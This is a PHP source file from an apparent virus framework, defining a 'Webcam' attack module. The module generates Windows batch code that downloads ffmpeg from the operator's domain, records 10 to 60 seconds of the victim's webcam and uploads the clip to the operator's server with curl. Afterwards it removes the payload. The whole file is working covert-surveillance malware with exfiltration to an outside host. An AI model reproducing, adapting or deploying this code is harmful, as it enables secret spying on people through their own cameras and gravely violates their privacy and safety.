<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\Webcam;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScript\Windows;

/**
 * Class Webcam. Records what is on the webcam for a duration of time (10 to 60 seconds)
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class Webcam extends AttackBase {
    public const MIN_DURATION = 10;
    public const MAX_DURATION = 60;
    private int $durationInSeconds = self::MIN_DURATION;

    public function getDuration(): int {
        return $this->durationInSeconds;
    }

    public function setDuration(int $duration) {
        $this->durationInSeconds = max(min($duration, self::MAX_DURATION), self::MIN_DURATION);
    }

    public function getClipPath() {
        return DATA_DIR . "/attacks/" . $this->getAttackId() . "/clip.mp4";
    }

    public function hasWebcam(): bool {
        return filesize($this->getClipPath()) > 0;
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        set /A count=0
        :download_loop
        if exist "%~pd0..\..\utils\ffmpeg.exe" (
            goto after_download_loop
        ) else (
            >"%~pd0..\..\utils\ffmpeg.exe" curl --max-time 200 <?php echo ALT_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/extras/ffmpeg\n"; ?>
        )
        call :getSize "%~pd0..\..\utils\ffmpeg.exe"
        if %size% gtr 0 goto after_download_loop
        del "%~pd0..\..\utils\ffmpeg.exe"
        set /A count+=1
        if %count% gtr <?php echo ATTACK_RESOURCE_DOWNLOAD_RETRIES; ?> goto after_capturing
        goto download_loop

        :after_download_loop
        "%~pd0..\..\utils\ffmpeg.exe" -y -f vfwcap -r 25 -t <?php echo $this->durationInSeconds; ?> -i 0 "%~pd0out.mp4"
        move "%~pd0out.mp4" "%~pd0out"

        :after_capturing
        if not exist "%~pd0out" (>"%~pd0out" type nul)
        <?php //@formatter:on
        echo Windows::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo Windows::cleanUpPayload();//@formatter:off ?>
        :getSize
        set /A size=%~z1
        exit /b 0
        <?php //@formatter:on
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "clip=@%~pd0out" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
        if ($resourceIdentifier == "ffmpeg") readfile(__DIR__ . "/resources/ffmpeg");
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->durationInSeconds = $state["duration"] ?? 10;
    }

    protected function getState(): string {
        $state = [];
        $state["duration"] = $this->durationInSeconds;
        return json_encode($state);
    }
}
